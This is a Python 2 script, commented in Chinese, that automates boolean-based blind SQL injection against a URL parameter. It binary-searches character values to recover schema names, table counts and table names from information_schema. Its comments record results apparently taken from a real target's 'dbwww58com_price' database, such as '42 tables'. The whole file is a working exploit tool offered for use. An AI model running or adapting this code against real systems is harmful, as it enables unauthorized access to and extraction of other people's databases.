import urlparse,urllib,re

#数组查找
def arrfind(arr, str):
    index = -1
    arrlen = len(arr)
    for v in range(0,arrlen):
        index = arr[v].find(str)
        #print index
        if index != -1:
            return v
    return False

def arrstring(arr, index, content):
    ourl = arr[0]
    arrlen = len(arr)
    for v in range(1,arrlen):
        if index == v:
            ourl += "&"+arr[v]+content
        else:
            ourl += "&"+arr[v]
    return ourl
#rtype 返回类型 1 数字 2 字母
def injection(url, location, sql, rtype = 1,low = 41, high = 126):
    urlarr = url.split('&')
    #print urlarr
    urlindex  = arrfind(urlarr, location)
    #print urlindex
    urlarr[urlindex] += sql
    #print urlarr
    
    dayu = " > "
    xiaoyu = " < "
    dengyu = " = "
    temyu = " = "#当前操作符
    cyu = " > "#缓冲操作符
    isDengyu = False
    mid = (low+high)/2 #二分中间数
    temmid = mid #缓冲二分中间数
    temlow = low
    temhigh = high
    n = 1
    arr = {}
    arr[mid] = 0
    while 1:
        n = n+1
        strmid = str(mid)
        condition = temyu + strmid
        ourl = arrstring(urlarr, urlindex, condition)
        #print ourl

        fp = urllib.urlopen(ourl)

        s = fp.read()

        m = re.search('price:(\d.\d)',s)

        f = cmp(temyu, dengyu)
        
        if m:
            #print '反回正确的内容'
            if temyu == dengyu:
                #print m.group(0),'---', m.group(1),'最小值',temlow,'最大值',temhigh,'ASCII值：', mid, '字母：', chr(mid)
                if rtype == 1:
                    return mid 
                elif rtype == 2:
                    return chr(mid)
                break
            else:    
                if f == 1:
                    if arr[mid] == 1:
                        mid = (temhigh+mid)/2
                        temlow = temmid
                        temmid = mid
                        #isDengyu = False
                        arr[mid] = 0
                    else:
                        cyu = temyu
                        temyu = dengyu
                elif f == -1:# cmp(<, =) -1 当前符号为小于
                    if arr[mid] == 1:
                        mid = (temlow+mid)/2
                        temhigh = temmid
                        temmid = mid
                        #isDengyu = False
                        arr[mid] = 0
                    else:
                        cyu = temyu
                        temyu = dengyu
        else:
           # print '反回不正确的内容'
            #print '最小值',temlow,'最大值',temhigh,'ASCII值：'
            if f == 0 and arr[mid] != 1: # cmp(=, =) 0 当前符号为等于 
                temyu = cyu
                #isDengyu = True
                arr[mid] = 1
            elif f == 1:# cmp(>,=) 1 当前符号为大于
                if arr[mid] == 1:
                    temyu = xiaoyu#改变符号 
                    mid = (temlow+mid)/2
                    temhigh = temmid
                    temmid = mid
                    #isDengyu = False
                    arr[mid] = 0
                else:
                    cyu = temyu
                    temyu = dengyu
                
            elif f == -1:# cmp(<, =) -1 当前符号为小于
                if arr[mid] == 1:
                    temyu = dayu
                    mid = (temhigh+mid)/2
                    temlow = temmid
                    temmid = mid
                    arr[mid] = 0
                    #isDengyu = False
                else:
                    cyu = temyu
                    temyu = dengyu


def db_len_inject(url, location, sqldblen):
    low = 1
    high = 50
    dblen = injection(url, location, sqldblen, 1,low, high)
    return dblen
    
def db_count_inject(url, location, sqldbcount):
    low = 1
    high = 100
    dbcount = injection(url, location, sqldbcount, 1, low, high)
    return dbcount

def db_name_inject(url, location, length): 
    num = 1
    db = ''
    while num <= length:
        strnum  = str(num)
        sqldbname= " and (SELECT ASCII(SUBSTRING(SCHEMA_NAME,"+strnum+",1)) from information_schema.SCHEMATA limit 1,1)"
        r = injection(url, location, sqldbname, 2)
        db += r
        num = num + 1
    return db

def table_name_inject(url, location, length, offset): 
    num = 1
    table = ''
    while num <= length:
        strnum  = str(num)
        sqldbname= " and (SELECT ASCII(SUBSTRING(TABLE_NAME,"+strnum+",1)) from information_schema.TABLES where TABLE_SCHEMA = 'dbwww58com_price' limit "+str(offset)+",1)"
        r = injection(url, location, sqldbname, 2)
        table += r
        num = num + 1
    return table

url='http://vulurl/'
location = 'localid'
sqldblen = " and (SELECT LENGTH(SCHEMA_NAME) from information_schema.SCHEMATA limit 1,1)"
sqldbcount = " and (SELECT COUNT(SCHEMA_NAME) from information_schema.SCHEMATA)"

#db_count_inject(url, location, sqldbcount)#3
#db_len_inject(url, location, sqldblen)#第二个数据库名limit 1,1长度为16
#length = 16
#db_name_inject(url, location, length)
sqltablecount = " and (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'dbwww58com_price')"


tablecount = db_count_inject(url, location, sqltablecount)#42张表
print '表个数：',tablecount
offset = 0
tablenamearr = []
while offset < tablecount:
    sqltablelen = " and (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'dbwww58com_price' limit "+str(offset)+",1)"
    length = db_len_inject(url, location, sqltablelen)#第一张表名长度为10
    print '第',(offset+1),'表长度：', length
    
    tablename = table_name_inject(url, location, length, offset)
    print '第',(offset+1),'表名：', tablename
    tablenamearr.append(tablename)
    offset = offset + 1

print tablenamearr






